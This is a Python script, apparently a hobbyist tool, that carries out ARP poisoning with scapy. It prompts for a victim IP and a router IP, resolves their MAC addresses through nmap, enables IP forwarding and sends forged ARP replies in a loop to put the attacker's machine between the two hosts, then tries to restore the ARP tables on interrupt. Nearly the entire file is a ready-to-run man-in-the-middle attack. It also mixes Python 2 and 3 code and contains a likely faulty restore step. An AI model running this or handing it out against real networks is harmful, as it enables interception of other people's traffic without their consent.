#!/usr/bin/python
import sys, os, time, subprocess , commands, colorama
from scapy.all import *

banner = """
arp poisening by  : matin nouriyan
███╗   ███╗ █████╗ ████████╗██╗████████╗ █████╗ ███╗   ██╗██╗██╗   ██╗███╗   ███╗
████╗ ████║██╔══██╗╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║██║██║   ██║████╗ ████║
██╔████╔██║███████║   ██║   ██║   ██║   ███████║██╔██╗ ██║██║██║   ██║██╔████╔██║
██║╚██╔╝██║██╔══██║   ██║   ██║   ██║   ██╔══██║██║╚██╗██║██║██║   ██║██║╚██╔╝██║
██║ ╚═╝ ██║██║  ██║   ██║   ██║   ██║   ██║  ██║██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
usage = 1 : chmod +x ArpPoisening.py - 2 : ./ArpPoisening.py                                                                       
                                                                                 
                                                                                 """

# show banner and usage 
print(colorama.Fore.CYAN+banner)
victimIP = input(colorama.Fore.RED+"Enter target ip ==> :   ")
routerIP = input(colorama.Fore.RED+"Enter router ip ==> : ")
print(colorama.Fore.GREEN+ "if you dont have router ip type in terminal = ip route ")
# get mac addres with ip by brodcast 
def GET_MAC(IP):
    with open('MAC.txt', 'w') as f:
	    subprocess.call(['nmap','-sP',IP,],stdout=f)
	    status, output = commands.getstatusoutput("grep MAC MAC.txt | cut -f 3 -d' '")
	    os.system("rm -rf MAC.txt")
	    return output

# poisen arp table and send arp pakate
def poisoning(routerIP, victimIP):
    victimMAC = GET_MAC(victimIP)
    routerMAC = GET_MAC(routerIP)
    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC), count = 3)
    send(ARP(op =2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC), count = 3)

def Restore(routerIP, victimIP):
    victimMAC = GET_MAC(victimIP)
    routerMAC = GET_MAC(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 10) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 10)


def ARP_POISONING():
    # enable ip forarding in terminal for os
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            poisoning(routerIP, victimIP)
            time.sleep(1)
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)

if __name__ == "__main__":
    ARP_POISONING()